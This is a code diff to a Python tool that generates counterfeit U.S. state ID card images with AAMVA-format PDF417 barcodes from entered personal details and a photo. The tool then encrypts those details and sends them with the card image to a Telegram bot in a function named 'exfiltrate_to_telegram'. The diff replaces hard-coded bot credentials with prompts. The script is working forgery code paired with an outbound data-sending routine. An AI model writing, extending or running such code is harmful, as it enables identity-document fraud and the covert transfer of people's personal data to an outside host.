@@ -11,12 +11,6 @@ from base64 import b64encode
 import io
 import os
 
-# Telegram configuration (replace with your bot's details)
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # e.g., "123456:ABC-DEF1234ghIkl-xyz"
-TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"    # e.g., "123456789"
-TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-TELEGRAM_PHOTO_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
-
 # Chaos-driven configuration
 CHAOS_SEED = random.randint(1, 1000000)
 ENCRYPTION_KEY = b"chaoskey1234567890"  # 16-byte AES key
@@ -33,10 +27,15 @@ STATE_FORMATS = {
     "FL": {"bg_color": (200, 255, 200), "text_color": (0, 100, 0), "font": "verdana.ttf"}
 }
 
-# Function to collect user input
+# Function to collect user input, including Telegram details
 def collect_user_input():
-    print("Enter ID Card Details:")
-    details = {
+    print("Enter Telegram Bot Details:")
+    telegram_details = {
+        "bot_token": input("Telegram Bot Token (e.g., 123456:ABC-DEF1234ghIkl-xyz): "),
+        "chat_id": input("Telegram Chat ID (e.g., 123456789): ")
+    }
+    print("\nEnter ID Card Details:")
+    id_details = {
         "state": input("State (e.g., CA, NY, TX): ").upper(),
         "first_name": input("First Name: "),
         "last_name": input("Last Name: "),
@@ -50,10 +49,10 @@ def collect_user_input():
         "photo_path": input("Path to portrait image (JPG/PNG, e.g., photo.jpg): ")
     }
     # Validate photo path
-    if not os.path.exists(details["photo_path"]):
-        print(f"Photo not found at {details['photo_path']}. Using default placeholder.")
-        details["photo_path"] = None
-    return details
+    if not os.path.exists(id_details["photo_path"]):
+        print(f"Photo not found at {id_details['photo_path']}. Using default placeholder.")
+        id_details["photo_path"] = None
+    return telegram_details, id_details
 
 # Function to generate AAMVA-compliant PDF417 barcode data
 def generate_aamva_data(details):
@@ -133,7 +132,7 @@ def generate_id_card(details, barcode_img):
     draw.text((random.randint(50, 900), random.randint(50, 500)), 
               f"CHAOS-{chaos_string(5)}", fill=(text_color[0], text_color[1], text_color[2], 50), font=font)
     
-    # Save to buffer instead of disk
+    # Save to buffer
     buffer = io.BytesIO()
     card.save(buffer, format="PNG")
     buffer.seek(0)
@@ -147,14 +146,15 @@ def encrypt_data(data):
     return b64encode(nonce + ciphertext).decode()
 
 # Exfiltrate to Telegram
-def exfiltrate_to_telegram(details, card_buffer):
+def exfiltrate_to_telegram(telegram_details, id_details, card_buffer):
     try:
-        encrypted_data = encrypt_data(json.dumps(details))
+        telegram_api_url = f"https://api.telegram.org/bot{telegram_details['bot_token']}/sendPhoto"
+        encrypted_data = encrypt_data(json.dumps(id_details))
         message = f"🔒 Chaos ID Card (Seed: {CHAOS_SEED})\nEncrypted Data: {encrypted_data}"
         files = {"photo": ("id_card.png", card_buffer, "image/png")}
         response = requests.post(
-            TELEGRAM_PHOTO_URL,
-            data={"chat_id": TELEGRAM_CHAT_ID, "caption": message},
+            telegram_api_url,
+            data={"chat_id": telegram_details["chat_id"], "caption": message},
             files=files
         )
         return response.status_code == 200
@@ -166,25 +166,20 @@ def exfiltrate_to_telegram(details, card_buffer):
 def main():
     print("Chaos U.S. State ID Card Generator (Telegram Exfiltration)")
     
-    # Validate Telegram configuration
-    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
-        print("Error: Please configure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.")
-        return
-    
-    # Collect user input
-    details = collect_user_input()
+    # Collect user input for Telegram and ID details
+    telegram_details, id_details = collect_user_input()
     
     # Generate AAMVA-compliant barcode data
-    aamva_data = generate_aamva_data(details)
+    aamva_data = generate_aamva_data(id_details)
     
     # Generate PDF417 barcode
     barcode_img = generate_pdf417_barcode(aamva_data)
     
     # Generate ID card image in memory
-    card_buffer = generate_id_card(details, barcode_img)
+    card_buffer = generate_id_card(id_details, barcode_img)
     
     # Exfiltrate to Telegram
-    if exfiltrate_to_telegram(details, card_buffer):
+    if exfiltrate_to_telegram(telegram_details, id_details, card_buffer):
         print("ID card exfiltrated to Telegram successfully (simulated).")
     else:
         print("Telegram exfiltration failed (simulated).")
